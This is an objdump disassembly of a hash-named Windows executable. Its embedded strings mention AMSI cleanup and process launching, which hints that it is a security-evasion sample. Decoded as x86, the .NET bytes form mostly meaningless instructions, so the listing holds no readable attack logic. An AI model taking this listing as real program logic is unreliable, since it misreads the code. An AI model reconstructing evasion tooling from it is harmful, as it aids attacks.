
fa98c952dc568cbea659ad8505ed2ee177ee6ad22dcec6b879994299d2cff278.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	lock add BYTE PTR ds:[eax],al
  402004:	add    BYTE PTR [eax],al
  402006:	add    BYTE PTR [eax],al
  402008:	dec    eax
  402009:	add    BYTE PTR [eax],al
  40200b:	add    BYTE PTR [edx],al
  40200d:	add    BYTE PTR ds:0x25e400,al
  402013:	add    BYTE PTR [eax+0xb000017],ah
  402019:	add    BYTE PTR [eax],al
  40201b:	add    BYTE PTR [ecx],al
  40201d:	add    BYTE PTR [eax],al
  40201f:	push   es
  402020:	fsub   DWORD PTR [ebx]
  402022:	add    BYTE PTR [eax],al
  402024:	or     eax,DWORD PTR [edx]
  402026:	add    BYTE PTR [eax],al
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax],al
  40202d:	add    DWORD PTR [eax],eax
	...
  40204f:	add    BYTE PTR [esi+0x36],ah
  402052:	adc    edx,DWORD PTR [edx-0x5e707ca9]
  402058:	je     0x40204b
  40205a:	adc    eax,0x9b24d434
  40205f:	or     al,0x20
  402061:	mov    edi,0xb8c68932
  402066:	shl    DWORD PTR [ecx+0x21],cl
  402069:	pop    ss
  40206a:	mov    ah,0xac
  40206c:	loop   0x4020d3
  40206e:	add    cl,bl
  402070:	sub    edx,DWORD PTR [eax+0x69]
  402073:	push   esi
  402074:	test   DWORD PTR [esp+eax*1-0x118fe883],edi
  40207b:	das    
  40207c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40207d:	scas   al,BYTE PTR es:[edi]
  40207e:	mov    ebp,DWORD PTR [ebx-0x25]
  402081:	or     ch,BYTE PTR [ecx+0x39d33b21]
  402087:	jnp    0x4020fa
  402089:	adc    al,bh
  40208b:	add    dh,dh
  40208d:	int3   
  40208e:	dec    ebp
  40208f:	stc    
  402090:	dec    esp
  402091:	popf   
  402092:	sbb    BYTE PTR [ebx+0x4b],0x25
  402096:	adc    DWORD PTR [esi+0x1f],ebp
  402099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40209a:	and    ebx,DWORD PTR [ecx-0x6a]
  40209d:	push   ebp
  40209e:	loop   0x4020a9
  4020a0:	mov    bl,0x86
  4020a2:	enter  0x99c0,0x71
  4020a6:	retf   0x6459
  4020a9:	fwait
  4020aa:	ins    BYTE PTR es:[edi],dx
  4020ab:	mov    ds:0xac7ec7f3,al
  4020b0:	jmp    0x1be30888
  4020b5:	je     0x4020d5
  4020b7:	pop    ds
  4020b8:	xchg   bl,cl
  4020ba:	loopne 0x4020ff
  4020bc:	sub    esi,DWORD PTR [edi-0x456da836]
  4020c2:	pushf  
  4020c3:	or     edi,DWORD PTR [edx-0x52]
  4020c6:	add    BYTE PTR [esi+0x57165058],dh
  4020cc:	sbb    eax,0x9a494123
  4020d1:	inc    esi
  4020d2:	or     eax,DWORD PTR [edx+eiz*2-0x4a73f158]
  4020d9:	pop    eax
  4020da:	jo     0x4020b4
  4020dc:	jae    0x402142
  4020de:	or     eax,0x3e873890
  4020e3:	xor    DWORD PTR [edx-0x56796bde],edi
  4020e9:	mov    WORD PTR [eax],ds
  4020eb:	ret    
  4020ec:	fadd   QWORD PTR [ebp+0x2b]
  4020ef:	in     al,dx
  4020f0:	dec    ebp
  4020f1:	push   ebp
  4020f2:	mov    ds:0x7a6e03c4,al
  4020f7:	pop    es
  4020f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020f9:	mov    edi,0xd56a4e40
  4020fe:	les    esi,FWORD PTR [ebx-0x17ff3351]
  402104:	(bad)  
  402105:	mov    al,BYTE PTR [edx+0x1a]
  402108:	mov    bl,0xb3
  40210a:	popa   
  40210b:	and    eax,DWORD PTR [edi-0x4b]
  40210e:	pop    edi
  40210f:	xor    edi,DWORD PTR [edx+0x73]
  402112:	repz sub cl,BYTE PTR [edi]
  402115:	fistp  WORD PTR [ebp+0x3d]
  402118:	push   0xa9c6e257
  40211d:	pop    edi
  40211e:	xor    eax,DWORD PTR [edx]
  402120:	int    0x84
  402122:	pop    eax
  402123:	mov    edi,0x210e871d
  402128:	(bad)  
  402129:	lock loope 0x402103
  40212c:	(bad)  
  40212d:	lea    esp,[ebp+0x66]
  402130:	jae    0x4020ec
  402132:	mov    ds:0x130dc93b,al
  402137:	sbb    eax,esp
  402139:	neg    DWORD PTR [ebx+0x41512852]
  40213f:	int    0x64
  402141:	add    al,0xee
  402143:	pop    ds
  402144:	push   esp
  402145:	fistp  QWORD PTR [edi-0x6f032af1]
  40214b:	ja     0x4020ef
  40214d:	imul   edx,DWORD PTR [esi+0x4301b5c],0x17900
  402157:	add    BYTE PTR [ecx],al
  402159:	add    BYTE PTR [eax],al
  40215b:	adc    DWORD PTR [ebx+0x15],esi
  40215e:	add    BYTE PTR [eax],al
  402160:	or     al,BYTE PTR [eax+0x4000001]
  402166:	jle    0x402169
  402168:	add    BYTE PTR [eax],al
  40216a:	add    al,0x28
  40216c:	or     al,BYTE PTR [eax]
  40216e:	add    BYTE PTR [esi],al
  402170:	outs   dx,DWORD PTR ds:[esi]
  402171:	push   ss
  402172:	add    BYTE PTR [eax],al
  402174:	or     ch,BYTE PTR [eax]
  402176:	pop    ss
  402177:	add    BYTE PTR [eax],al
  402179:	or     dh,BYTE PTR [edx+0x1]
  40217c:	add    BYTE PTR [eax],al
  40217e:	jo     0x4021a8
  402180:	sbb    BYTE PTR [eax],al
  402182:	add    BYTE PTR [edx],cl
  402184:	or     al,BYTE PTR [esi]
  402186:	outs   dx,DWORD PTR ds:[esi]
  402187:	sbb    DWORD PTR [eax],eax
  402189:	add    BYTE PTR [edx],cl
  40218b:	cmp    DWORD PTR [eax],ebx
  40218d:	add    DWORD PTR [eax],eax
  40218f:	add    BYTE PTR [esi],al
  402191:	outs   dx,DWORD PTR ds:[esi]
  402192:	sbb    al,BYTE PTR [eax]
  402194:	add    BYTE PTR [edx],cl
  402196:	outs   dx,DWORD PTR ds:[esi]
  402197:	sbb    eax,DWORD PTR [eax]
  402199:	add    BYTE PTR [edx],cl
  40219b:	sbb    al,BYTE PTR [eax+0x7]
  40219e:	add    DWORD PTR [eax],eax
  4021a0:	add    BYTE PTR [esi],al
  4021a2:	outs   dx,DWORD PTR ds:[esi]
  4021a3:	sbb    al,BYTE PTR [eax]
  4021a5:	add    BYTE PTR [edx],cl
  4021a7:	sbb    BYTE PTR [edi+0x1c],ch
  4021aa:	add    BYTE PTR [eax],al
  4021ac:	or     ch,BYTE PTR [edi+0x1d]
  4021af:	add    BYTE PTR [eax],al
  4021b1:	or     dl,BYTE PTR [edi]
  4021b3:	lea    esp,[eax]
  4021b5:	add    BYTE PTR [eax],al
  4021b7:	add    DWORD PTR [ebx],edx
  4021b9:	or     dl,BYTE PTR [ecx]
  4021bb:	or     dl,BYTE PTR [esi]
  4021bd:	pop    ds
  4021be:	and    bl,BYTE PTR [ebp+0x1e6f0a11]
  4021c4:	add    BYTE PTR [eax],al
  4021c6:	or     cl,BYTE PTR [ebx]
  4021c8:	push   es
  4021c9:	outs   dx,DWORD PTR ds:[esi]
  4021ca:	sbb    al,BYTE PTR [eax]
  4021cc:	add    BYTE PTR [edx],cl
  4021ce:	sbb    DWORD PTR [edi+0x1c],ebp
  4021d1:	add    BYTE PTR [eax],al
  4021d3:	or     ch,BYTE PTR [edi+0x1d]
  4021d6:	add    BYTE PTR [eax],al
  4021d8:	or     dl,BYTE PTR [edi]
  4021da:	lea    esp,[eax]
  4021dc:	add    BYTE PTR [eax],al
  4021de:	add    DWORD PTR [ebx],edx
  4021e0:	or     edx,DWORD PTR [ecx]
  4021e2:	or     edx,DWORD PTR [esi]
  4021e4:	pop    ds
  4021e5:	and    bl,BYTE PTR [ebp+0x1e6f0b11]
  4021eb:	add    BYTE PTR [eax],al
  4021ed:	or     cl,BYTE PTR [eax+ebp*1]
  4021f0:	pop    ds
  4021f1:	add    BYTE PTR [eax],al
  4021f3:	or     ch,BYTE PTR [esi+edx*1]
  4021f6:	sub    BYTE PTR [eax],cl
  4021f8:	add    BYTE PTR [eax],al
  4021fa:	push   es
  4021fb:	push   ss
  4021fc:	lea    eax,[ecx]
  4021fe:	add    BYTE PTR [eax],al
  402200:	add    DWORD PTR [eax],ebp
  402202:	and    BYTE PTR [eax],al
  402204:	add    BYTE PTR [edx],cl
  402206:	sub    BYTE PTR [edx],al
  402208:	add    BYTE PTR [eax],al
  40220a:	push   es
  40220b:	sub    ch,BYTE PTR [eax]
  40220d:	and    DWORD PTR [eax],eax
  40220f:	add    BYTE PTR [edx],cl
  402211:	or     eax,0x14041314
  402216:	adc    eax,DWORD PTR ds:0x2228
  40221c:	or     ch,BYTE PTR [eax]
  40221e:	and    eax,DWORD PTR [eax]
  402220:	add    BYTE PTR [edx],cl
  402222:	adc    eax,DWORD PTR [esi]
  402224:	adc    al,0x13
  402226:	pop    es
  402227:	or     DWORD PTR ds:0x24731732,ebx
  40222d:	add    BYTE PTR [eax],al
  40222f:	or     dl,BYTE PTR [ebx]
  402231:	or     BYTE PTR [ecx],dl
  402233:	or     BYTE PTR [edi],al
  402235:	pop    es
  402236:	sub    BYTE PTR ds:0x6f0a0000,ah
  40223c:	add    BYTE PTR es:[eax],al
  40223f:	or     dl,BYTE PTR [ebx]
  402241:	pop    es
  402242:	adc    DWORD PTR [esi],eax
  402244:	jae    0x40226d
  402246:	add    BYTE PTR [eax],al
  402248:	or     dl,BYTE PTR [ebx]
  40224a:	add    eax,0x73080711
  40224f:	sub    BYTE PTR [eax],al
  402251:	add    BYTE PTR [edx],cl
  402253:	adc    eax,DWORD PTR [eax+ebx*1]
  402256:	lea    ebp,[eax+eax*1]
  402259:	add    BYTE PTR [ecx],al
  40225b:	adc    ecx,DWORD PTR [ecx+edx*1]
  40225e:	or     al,0x16
  402260:	adc    DWORD PTR ds:0x170c11a2,eax
  402266:	adc    DWORD PTR [edi+ebp*2],eax
  402269:	sub    DWORD PTR [eax],eax
  40226b:	add    BYTE PTR [edx],cl
  40226d:	mov    ds:0x2a280c11,al
  402272:	add    BYTE PTR [eax],al
  402274:	or     ah,BYTE PTR [esi]
  402276:	adc    DWORD PTR [edi+ebp*2],eax
  402279:	sub    eax,DWORD PTR [eax]
  40227b:	add    BYTE PTR [edx],cl
  40227d:	ficom  WORD PTR [eax]
  40227f:	adc    ecx,DWORD PTR [ecx]
  402281:	adc    DWORD PTR [ecx],ecx
  402283:	outs   dx,DWORD PTR ds:[esi]
  402284:	sub    al,0x0
  402286:	add    BYTE PTR [edx],cl
  402288:	sub    BYTE PTR [edx],al
  40228a:	add    BYTE PTR [eax],al
  40228c:	push   es
  40228d:	fiadd  WORD PTR [eax]
  40228f:	fiadd  WORD PTR [ebx+0x11]
  402292:	add    al,0x2c
  402294:	pop    es
  402295:	adc    DWORD PTR [edi+ebp*2],eax
  402298:	sub    eax,0x110a0000
  40229d:	add    eax,0x511072c
  4022a2:	outs   dx,DWORD PTR ds:[esi]
  4022a3:	add    BYTE PTR cs:[eax],al
  4022a6:	or     bl,ah
  4022a8:	sub    BYTE PTR [ecx],cl
  4022aa:	add    BYTE PTR [eax],al
  4022ac:	push   es
  4022ad:	pop    ss
  4022ae:	lea    eax,[ecx]
  4022b0:	add    BYTE PTR [eax],al
  4022b2:	add    DWORD PTR [ebx],edx
  4022b4:	or     eax,0x28160d11
  4022b9:	and    al,BYTE PTR [eax]
  4022bb:	add    BYTE PTR [edx],cl
  4022bd:	outs   dx,DWORD PTR ds:[esi]
  4022be:	das    
  4022bf:	add    BYTE PTR [eax],al
  4022c1:	or     ch,BYTE PTR [edi+0x30]
  4022c4:	add    BYTE PTR [eax],al
  4022c6:	or     ah,BYTE PTR [edx+0x20280d11]
  4022cc:	add    BYTE PTR [eax],al
  4022ce:	or     ch,BYTE PTR [eax]
  4022d0:	add    al,BYTE PTR [eax]
  4022d2:	add    BYTE PTR [esi],al
  4022d4:	sub    al,BYTE PTR [eax]
  4022d6:	add    BYTE PTR [eax],al
  4022d8:	add    DWORD PTR [eax+eax*1],ebx
  4022db:	add    BYTE PTR [eax],al
  4022dd:	add    BYTE PTR [eax+eax*1+0x10012367],bh
  4022e4:	xor    DWORD PTR [eax],eax
  4022e6:	add    BYTE PTR [ecx],al
  4022e8:	add    al,BYTE PTR [eax]
  4022ea:	mov    esp,0x1357900
  4022ef:	pop    ss
  4022f0:	add    BYTE PTR [eax],al
  4022f2:	add    BYTE PTR [eax],al
  4022f4:	or     esi,DWORD PTR [eax]
  4022f6:	add    eax,DWORD PTR [eax]
  4022f8:	adc    al,BYTE PTR [eax]
  4022fa:	add    BYTE PTR [eax],al
  4022fc:	add    BYTE PTR [eax],al
  4022fe:	add    BYTE PTR [eax],al
  402300:	jle    0x402303
  402302:	add    BYTE PTR [eax],al
  402304:	add    al,0x2
  402306:	pop    ss
  402307:	outs   dx,DWORD PTR ds:[esi]
  402308:	xor    DWORD PTR [eax],eax
  40230a:	add    BYTE PTR [edx],cl
  40230c:	fiadd  WORD PTR [ebx]
  40230e:	fiadd  WORD PTR es:[eax]
  402311:	sub    al,BYTE PTR [eax]
  402313:	add    BYTE PTR [ecx],al
  402315:	adc    BYTE PTR [eax],al
  402317:	add    BYTE PTR [eax],al
  402319:	add    BYTE PTR [eax],al
  40231b:	add    BYTE PTR [esi],cl
  40231d:	push   cs
  40231e:	add    BYTE PTR [ebx],al
  402320:	xor    eax,DWORD PTR [eax]
  402322:	add    BYTE PTR [ecx],al
  402324:	push   ds
  402325:	add    ch,BYTE PTR [eax]
  402327:	xor    eax,0x2a0a0000
  40232c:	adc    esi,DWORD PTR [eax]
  40232e:	add    al,BYTE PTR [eax]
  402330:	xor    eax,DWORD PTR [eax]
  402332:	add    BYTE PTR [eax],al
  402334:	add    eax,DWORD PTR [eax]
  402336:	add    BYTE PTR [ecx],dl
  402338:	jle    0x40233c
  40233a:	add    BYTE PTR [eax],al
  40233c:	add    al,0x14
  40233e:	sub    BYTE PTR [esi],dh
  402340:	add    BYTE PTR [eax],al
  402342:	or     ch,BYTE PTR [eax+eiz*1]
  402345:	jb     0x402384
  402347:	add    BYTE PTR [eax],al
  402349:	jo     0x40231b
  40234b:	add    eax,DWORD PTR [eax]
  40234d:	add    BYTE PTR [edx],al
  40234f:	sub    BYTE PTR [edi],dh
  402351:	add    BYTE PTR [eax],al
  402353:	or     ch,BYTE PTR [edi+0x38]
  402356:	add    BYTE PTR [eax],al
  402358:	or     dh,BYTE PTR [ebx+0x39]
  40235b:	add    BYTE PTR [eax],al
  40235d:	or     cl,BYTE PTR [edx]
  40235f:	push   es
  402360:	add    BYTE PTR [edx],0x0
  402363:	add    BYTE PTR [esi+edi*2],al
  402366:	add    al,BYTE PTR [eax]
  402368:	add    BYTE PTR [edx+ebp*1],al
  40236b:	sbb    bh,BYTE PTR [esi+0x3]
  40236e:	add    BYTE PTR [eax],al
  402370:	add    al,0x2a
  402372:	push   ds
  402373:	add    al,BYTE PTR [eax+0x4000003]
  402379:	sub    dl,BYTE PTR [esi+0x28]
  40237c:	add    al,0x0
  40237e:	add    BYTE PTR [esi],al
  402380:	jb     0x402327
  402382:	add    BYTE PTR [eax],al
  402384:	jo     0x402404
  402386:	add    eax,DWORD PTR [eax]
  402388:	add    BYTE PTR [edi+ebp*2],al
  40238b:	cmp    al,BYTE PTR [eax]
  40238d:	add    BYTE PTR [edx],cl
  40238f:	sub    dl,BYTE PTR [esi+0x28]
  402392:	add    al,0x0
  402394:	add    BYTE PTR [esi],al
  402396:	jb     0x40235d
  402398:	add    BYTE PTR [eax],al
  40239a:	jo     0x40241a
  40239c:	add    eax,DWORD PTR [eax]
  40239e:	add    BYTE PTR [edi+ebp*2],al
  4023a1:	cmp    al,BYTE PTR [eax]
  4023a3:	add    BYTE PTR [edx],cl
  4023a5:	sub    dl,BYTE PTR [esi+0x28]
  4023a8:	add    al,0x0
  4023aa:	add    BYTE PTR [esi],al
  4023ac:	jb     0x40239b
  4023ae:	add    BYTE PTR [eax],al
  4023b0:	jo     0x402430
  4023b2:	add    eax,DWORD PTR [eax]
  4023b4:	add    BYTE PTR [edi+ebp*2],al
  4023b7:	cmp    al,BYTE PTR [eax]
  4023b9:	add    BYTE PTR [edx],cl
  4023bb:	sub    dl,BYTE PTR [esi+0x28]
  4023be:	add    al,0x0
  4023c0:	add    BYTE PTR [esi],al
  4023c2:	jb     0x4023c9
  4023c4:	add    DWORD PTR [eax],eax
  4023c6:	jo     0x402446
  4023c8:	add    eax,DWORD PTR [eax]
  4023ca:	add    BYTE PTR [edi+ebp*2],al
  4023cd:	cmp    al,BYTE PTR [eax]
  4023cf:	add    BYTE PTR [edx],cl
  4023d1:	sub    al,BYTE PTR [eax]
  4023d3:	add    BYTE PTR [eax],al
  4023d5:	add    BYTE PTR [eax],al
  4023d7:	add    BYTE PTR [edi],al
  4023d9:	add    al,BYTE PTR [eax]
  4023db:	add    dh,cl
  4023dd:	retf   0xbeef
  4023e0:	add    DWORD PTR [eax],eax
  4023e2:	add    BYTE PTR [eax],al
  4023e4:	xchg   ecx,eax
  4023e5:	add    BYTE PTR [eax],al
  4023e7:	add    BYTE PTR [ebx+edx*2+0x79],ch
  4023eb:	jae    0x402461
  4023ed:	gs ins DWORD PTR es:[edi],dx
  4023ef:	cs push edx
  4023f1:	gs jae 0x402463
  4023f4:	jne    0x402468
  4023f6:	arpl   WORD PTR [ebp+0x73],sp
  4023f9:	cs push edx
  4023fb:	gs jae 0x40246d
  4023fe:	jne    0x402472
  402400:	arpl   WORD PTR [ebp+0x52],sp
  402403:	gs popa 
  402405:	fs gs jb 0x402435
  402409:	and    BYTE PTR [ebp+0x73],ch
  40240c:	arpl   WORD PTR [edi+0x72],bp
  40240f:	ins    BYTE PTR es:[edi],dx
  402410:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  402417:	jae    0x402482
  402419:	outs   dx,DWORD PTR ds:[esi]
  40241a:	outs   dx,BYTE PTR ds:[esi]
  40241b:	cmp    eax,0x2e302e34
  402420:	xor    BYTE PTR [esi],ch
  402422:	xor    BYTE PTR [eax+eiz*1],ch
  402425:	inc    ebx
  402426:	jne    0x402494
  402428:	je     0x40249f
  40242a:	jb     0x402491
  40242c:	cmp    eax,0x7475656e
  402431:	jb     0x402494
  402433:	ins    BYTE PTR es:[edi],dx
  402434:	sub    al,0x20
  402436:	push   eax
  402437:	jne    0x40249b
  402439:	ins    BYTE PTR es:[edi],dx
  40243a:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  402441:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  402445:	bound  esi,QWORD PTR [edi]
  402447:	aaa    
  402448:	popa   
  402449:	xor    eax,0x31363563
  40244e:	cmp    DWORD PTR [ebx],esi
  402450:	xor    al,0x65
  402452:	xor    BYTE PTR [eax],bh
  402454:	cmp    DWORD PTR [ebx],esp
  402456:	push   ebx
  402457:	jns    0x4024cc
  402459:	je     0x4024c0
  40245b:	ins    DWORD PTR es:[edi],dx
  40245c:	cs push edx
  40245e:	gs jae 0x4024d0
  402461:	jne    0x4024d5
  402463:	arpl   WORD PTR [ebp+0x73],sp
  402466:	cs push edx
  402468:	jne    0x4024d8
  40246a:	je     0x4024d5
  40246c:	ins    DWORD PTR es:[edi],dx
  40246d:	gs push edx
  40246f:	gs jae 0x4024e1
  402472:	jne    0x4024e6
  402474:	arpl   WORD PTR [ebp+0x53],sp
  402477:	gs je  0x40247c
  40247a:	add    BYTE PTR [eax],al
  40247c:	add    BYTE PTR [eax+eax*1],al
  40247f:	add    BYTE PTR [eax],al
  402481:	add    BYTE PTR [eax],al
  402483:	add    BYTE PTR [eax],al
  402485:	push   eax
  402486:	inc    ecx
  402487:	inc    esp
  402488:	push   eax
  402489:	inc    ecx
  40248a:	inc    esp
  40248b:	push   eax
  40248c:	xor    eax,0x2fcbdc57
  402491:	nop    ecx
  402494:	out    0x5d,eax
  402496:	daa    
  402497:	or     cl,BYTE PTR [eax+0x6e097f]
  40249d:	add    BYTE PTR [eax],al
  40249f:	add    BYTE PTR [ebx],ah
  4024a1:	add    BYTE PTR [eax],al
  4024a3:	add    BYTE PTR [esi+0x0],cl
  4024a6:	add    BYTE PTR [eax],al
  4024a8:	imul   eax,DWORD PTR [eax],0x1680000
  4024ae:	add    BYTE PTR [eax],al
  4024b0:	push   ds
  4024b1:	inc    ebp
  4024b2:	add    BYTE PTR [edx+0x0],dh
  4024b5:	jb     0x4024b7
  4024b7:	outs   dx,DWORD PTR ds:[esi]
  4024b8:	add    BYTE PTR [edx+0x0],dh
  4024bb:	pop    edi
  4024bc:	add    BYTE PTR [ebp+0x0],al
  4024bf:	js     0x4024c1
  4024c1:	arpl   WORD PTR [eax],ax
  4024c3:	add    BYTE PTR gs:[eax+0x0],dh
  4024c7:	je     0x4024c9
  4024c9:	imul   eax,DWORD PTR [eax],0x6e006f
  4024cf:	add    BYTE PTR [eax],al
  4024d1:	add    BYTE PTR [eax],al
  4024d3:	es inc ebp
  4024d5:	add    BYTE PTR [edx+0x0],dh
  4024d8:	jb     0x4024da
  4024da:	outs   dx,DWORD PTR ds:[esi]
  4024db:	add    BYTE PTR [edx+0x0],dh
  4024de:	pop    edi
  4024df:	add    BYTE PTR [ecx+0x0],cl
  4024e2:	dec    ecx
  4024e3:	add    BYTE PTR [ebx+0x0],dl
  4024e6:	dec    esi
  4024e7:	add    BYTE PTR [edi+0x0],ch
  4024ea:	je     0x4024ec
  4024ec:	push   eax
  4024ed:	add    BYTE PTR [edx+0x0],dh
  4024f0:	add    BYTE PTR gs:[ebx+0x0],dh
  4024f4:	add    BYTE PTR gs:[esi+0x0],ch
  4024f8:	je     0x4024fa
  4024fa:	sub    DWORD PTR [eax],eax
  4024fc:	add    BYTE PTR [eax],al
  4024fe:	push   ss
  4024ff:	inc    ebp
  402500:	add    BYTE PTR [edx+0x0],dh
  402503:	jb     0x402505
  402505:	outs   dx,DWORD PTR ds:[esi]
  402506:	add    BYTE PTR [edx+0x0],dh
  402509:	pop    edi
  40250a:	add    BYTE PTR [ebp+0x0],dl
  40250d:	jae    0x40250f
  40250f:	popa   
  402510:	add    BYTE PTR [edi+0x0],ah
  402513:	add    BYTE PTR gs:[edx+0x0],dl
  402517:	add    BYTE PTR [eax],al
  402519:	es inc ebp
  40251b:	add    BYTE PTR [esi+0x0],dh
  40251e:	add    BYTE PTR gs:[esi+0x0],ch
  402522:	je     0x402524
  402524:	dec    esp
  402525:	add    BYTE PTR [edi+0x0],ch
  402528:	add    BYTE PTR [bx+0x0],bl
  40252c:	push   ebx
  40252d:	add    BYTE PTR [edi+0x0],ch
  402530:	jne    0x402532
  402532:	jb     0x402534
  402534:	arpl   WORD PTR [eax],ax
  402536:	add    BYTE PTR gs:[esi+0x0],cl
  40253a:	popa   
  40253b:	add    BYTE PTR [ebp+0x0],ch
  40253e:	add    BYTE PTR gs:[ecx+0x1000000],dl
  402545:	daa    
  402546:	inc    esi
  402547:	popa   
  402548:	imul   ebp,DWORD PTR [ebp+eiz*2+0x64],0x206f7420
  402550:	arpl   WORD PTR [ebp+eiz*2+0x61],bp
  402554:	outs   dx,BYTE PTR ds:[esi]
  402555:	and    BYTE PTR [ebp+0x70],dh
  402558:	and    BYTE PTR [ecx+0x49],cl
  40255b:	push   ebx
  40255c:	and    BYTE PTR [ebp+0x6e],ah
  40255f:	jbe    0x4025ca
  402561:	jb     0x4025d2
  402563:	outs   dx,BYTE PTR ds:[esi]
  402564:	ins    DWORD PTR es:[edi],dx
  402565:	outs   dx,BYTE PTR gs:[esi]
  402567:	je     0x4025a3
  402569:	and    BYTE PTR [ebx+0x30],bh
  40256c:	jge    0x40256f
  40256e:	daa    
  40256f:	dec    ecx
  402570:	dec    ecx
  402571:	push   ebx
  402572:	and    BYTE PTR [ebx+0x6f],ah
  402575:	jne    0x4025e3
  402577:	and    BYTE PTR fs:[esi+0x6f],ch
  40257b:	je     0x40259d
  40257d:	bound  esp,QWORD PTR [ebp+0x20]
  402580:	fs gs je 0x4025e9
  402584:	arpl   WORD PTR [ebp+eiz*2+0x64],si
  402588:	and    BYTE PTR [edi+0x6e],ch
  40258b:	and    BYTE PTR [edi+ebp*2+0x63],ch
  40258f:	popa   
  402590:	ins    BYTE PTR es:[edi],dx
  402591:	push   0x2e74736f
  402596:	add    DWORD PTR ds:0x6c696146,edi
  40259c:	gs and BYTE PTR fs:[edi+ebp*2+0x20],dh
  4025a2:	ins    BYTE PTR es:[edi],dx
  4025a3:	popa   
  4025a4:	jne    0x402614
  4025a6:	arpl   WORD PTR [eax+0x20],bp
  4025a9:	jnp    0x4025db
  4025ab:	jge    0x4025e8
  4025ad:	and    BYTE PTR [eax+ebp*2+0x65],dl
  4025b1:	and    BYTE PTR [ebp+0x73],dh
  4025b4:	popa   
  4025b5:	and    BYTE PTR gs:[bx+di+0x73],ch
  4025ba:	and    BYTE PTR [ebx+0x30],bh
  4025bd:	jge    0x4025df
  4025bf:	pop    esp
  4025c0:	and    bh,BYTE PTR [esi*2+0x5c3e6c72]
  4025c7:	and    ah,BYTE PTR [eax]
  4025c9:	pop    esp
  4025ca:	and    dl,BYTE PTR [ebx+0x65]
  4025cd:	je     0x402643
  4025cf:	imul   ebp,DWORD PTR [esi+0x67],0x1225c73
  4025d6:	or     al,0x49
  4025d8:	outs   dx,BYTE PTR ds:[esi]
  4025d9:	je     0x402640
  4025db:	ins    BYTE PTR es:[edi],dx
  4025dc:	ins    BYTE PTR es:[edi],dx
  4025dd:	imul   edx,DWORD PTR [edx+esi*2+0x61],0x42006563
  4025e5:	push   ebx
  4025e6:	dec    edx
  4025e7:	inc    edx
  4025e8:	add    DWORD PTR [eax],eax
  4025ea:	add    DWORD PTR [eax],eax
  4025ec:	add    BYTE PTR [eax],al
  4025ee:	add    BYTE PTR [eax],al
  4025f0:	or     al,0x0
  4025f2:	add    BYTE PTR [eax],al
  4025f4:	jbe    0x40262a
  4025f6:	xor    BYTE PTR cs:[esi],ch
  4025f9:	xor    esi,DWORD PTR [eax]
  4025fb:	xor    esi,DWORD PTR [ecx]
  4025fd:	cmp    DWORD PTR [eax],eax
  4025ff:	add    BYTE PTR [eax],al
  402601:	add    BYTE PTR ds:0x6c00,al
  402607:	add    BYTE PTR [eax+0x23000005],dl
  40260d:	jle    0x40260f
  40260f:	add    ah,bh
  402611:	add    eax,0x9ac0000
  402616:	add    BYTE PTR [eax],al
  402618:	and    edx,DWORD PTR [ebx+0x74]
  40261b:	jb     0x402686
  40261d:	outs   dx,BYTE PTR ds:[esi]
  40261e:	addr16 jae 0x402621
  402621:	add    BYTE PTR [eax],al
  402623:	add    BYTE PTR [eax+0x3000000f],ch
  402629:	add    DWORD PTR [eax],eax
  40262b:	add    BYTE PTR [ebx],ah
  40262d:	push   ebp
  40262e:	push   ebx
  40262f:	add    al,bl
  402631:	adc    BYTE PTR [eax],al
  402633:	add    BYTE PTR [eax],dl
  402635:	add    BYTE PTR [eax],al
  402637:	add    BYTE PTR [ebx],ah
  402639:	inc    edi
  40263a:	push   ebp
  40263b:	dec    ecx
  40263c:	inc    esp
  40263d:	add    BYTE PTR [eax],al
  40263f:	add    al,ch
  402641:	adc    BYTE PTR [eax],al
  402643:	add    BYTE PTR [eax+0x23000006],bh
  402649:	inc    edx
  40264a:	ins    BYTE PTR es:[edi],dx
  40264b:	outs   dx,DWORD PTR ds:[esi]
  40264c:	bound  eax,QWORD PTR [eax]
  40264e:	add    BYTE PTR [eax],al
  402650:	add    BYTE PTR [eax],al
  402652:	add    BYTE PTR [eax],al
  402654:	add    al,BYTE PTR [eax]
  402656:	add    BYTE PTR [ecx],al
  402658:	push   edi
  402659:	adc    eax,0x10901a2
  40265e:	add    BYTE PTR [eax],al
  402660:	add    dl,bh
  402662:	and    eax,0x160033
  402667:	add    BYTE PTR [ecx],al
  402669:	add    BYTE PTR [eax],al
  40266b:	add    BYTE PTR [ebx],bh
  40266d:	add    BYTE PTR [eax],al
  40266f:	add    BYTE PTR [ebx],al
  402671:	add    BYTE PTR [eax],al
  402673:	add    BYTE PTR [ebx],al
  402675:	add    BYTE PTR [eax],al
  402677:	add    BYTE PTR [edx],cl
  402679:	add    BYTE PTR [eax],al
  40267b:	add    BYTE PTR [edx],al
  40267d:	add    BYTE PTR [eax],al
  40267f:	add    BYTE PTR [ebx],bh
  402681:	add    BYTE PTR [eax],al
  402683:	add    BYTE PTR [eax],bl
  402685:	add    BYTE PTR [eax],al
  402687:	add    BYTE PTR [ebx],al
  402689:	add    BYTE PTR [eax],al
  40268b:	add    BYTE PTR [ecx],al
  40268d:	add    BYTE PTR [eax],al
  40268f:	add    BYTE PTR [esi],al
  402691:	add    BYTE PTR [eax],al
  402693:	add    BYTE PTR [edi],al
  402695:	add    BYTE PTR [eax],al
  402697:	add    BYTE PTR [ecx],al
  402699:	add    BYTE PTR [eax],al
  40269b:	add    BYTE PTR [edi],al
  40269d:	add    BYTE PTR [eax],al
  40269f:	add    BYTE PTR [ecx],al
  4026a1:	add    BYTE PTR [eax],al
  4026a3:	add    BYTE PTR [eax],al
  4026a5:	add    BYTE PTR [edx],cl
  4026a7:	add    BYTE PTR [ecx],al
  4026a9:	add    BYTE PTR [eax],al
  4026ab:	add    BYTE PTR [eax],al
  4026ad:	add    BYTE PTR [esi],al
  4026af:	add    BYTE PTR [eax+eax*1+0x65],ch
  4026b3:	add    BYTE PTR [edx],cl
  4026b5:	add    BYTE PTR [esi+0x6007300],al
  4026bb:	add    BYTE PTR [ecx+0x600a800],bh
  4026c1:	add    dl,ch
  4026c3:	add    ch,dl
  4026c5:	add    BYTE PTR [esi],al
  4026c7:	add    dh,bh
